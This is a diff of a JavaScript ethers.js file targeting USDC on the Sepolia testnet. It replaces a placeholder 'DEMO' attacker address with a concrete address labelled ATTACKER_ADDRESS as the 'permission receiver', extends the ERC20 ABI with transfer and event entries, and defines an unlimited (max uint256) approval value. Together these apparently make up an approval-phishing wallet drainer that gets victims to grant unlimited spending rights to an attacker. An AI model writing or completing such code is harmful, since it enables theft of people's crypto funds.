@@ -8,17 +8,22 @@ import { ethers } from "ethers";
 // ✅ USDC on Sepolia
 const TOKEN_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";
 
-// ⚠️ DEMO address (permission receiver)
-const ATTACKER_ADDRESS = "0x1111111111111111111111111111111111111111";
+// ⚠️  address (permission receiver)
+const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";
 
-// ERC20 ABI (minimum required)
+// ERC20 ABI
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function allowance(address owner, address spender) view returns (uint256)",
-];
+  "function symbol() view returns (string)",
 
+  "function name() view returns (string)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "event Approval(address indexed owner, address indexed spender, uint256 value)",
+  "event Transfer(address indexed from, address indexed to, uint256 value)",
+];
 // Unlimited approval value
 const UNLIMITED =
   "115792089237316195423570985008687907853269984665640564039457584007913129639935";
